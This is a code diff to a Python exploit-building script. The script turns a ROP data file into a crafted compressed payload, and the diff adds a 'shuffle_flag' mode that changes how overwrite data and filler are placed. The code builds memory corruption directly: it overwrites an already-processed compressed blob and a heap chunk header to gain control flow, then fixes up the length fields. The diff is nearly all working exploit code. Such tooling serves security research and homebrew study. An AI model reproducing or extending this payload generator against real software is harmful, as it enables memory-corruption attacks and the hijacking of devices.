@@ -51,6 +51,7 @@ def superBlockFill(b):
 
 ropdata_fn = sys.argv[1]
 payload_fn = sys.argv[2] if len(sys.argv)>=3 else "payload.bin"
+shuffle_flag = int(sys.argv[7]) if len(sys.argv)>=8 else 0
 
 
 cmdfunc = [compressionBlock, compressionBlockExtended, compressionBlockExtraExtended]
@@ -76,12 +77,15 @@ out = list(bytearray(open("tmp", "rb").read()))
 
 # start by generating the end data so we know how much room we have to fill later on
 endStuff = []
-# first write data over already-processed compressed blob
-endStuff += superBlock(overwriteData[:8])
-endStuff += superBlock(overwriteData[8:])
-# then copy it a few times to overwrite the memchunk header
-endStuff += superBlock([compressionBlockExtraExtended(0x1000, 0x10), 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
-fillAmount = 0x2a0000 - len(endStuff)
+if shuffle_flag==0:
+	# first write data over already-processed compressed blob
+	endStuff += superBlock(overwriteData[:8])
+	endStuff += superBlock(overwriteData[8:])
+	# then copy it a few times to overwrite the memchunk header
+	endStuff += superBlock([compressionBlockExtraExtended(0x1000, 0x10), 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
+	fillAmount = 0x2a0000 - len(endStuff)
+else:
+	fillAmount = 0x150000 - len(endStuff)
 
 print(["0x%02X"%v for v in endStuff])
 
@@ -145,14 +149,25 @@ else:
 	adjustment = 16 - adjustment
 	print(adjustment)
 	overwriteData[:] = (overwriteData[(adjustment):(adjustment+8)]) + (overwriteData[-(8-adjustment):]+overwriteData[:adjustment])
-endStuff[0:9] = superBlock(overwriteData[:8])
-endStuff[9:18] = superBlock(overwriteData[8:])
+if shuffle_flag==0:
+	endStuff[0:9] = superBlock(overwriteData[:8])
+	endStuff[9:18] = superBlock(overwriteData[8:])
 
 # output file
 out += filler
 out += endStuff
 
-totalLength = dataOffset+0x1010
+if shuffle_flag==1:
+	if len(out) > 0x150000:
+		raise Exception("The generated payload prior to adding the footer is already too large.")
+	while len(out) < 0x150000:
+		out += [0x00]
+	out += overwriteData
+
+if shuffle_flag==0:
+	dataOffset+= 0x1010
+
+totalLength = dataOffset
 out[1] = totalLength&0xFF
 out[2] = (totalLength>>8)&0xFF
 out[3] = (totalLength>>16)&0xFF
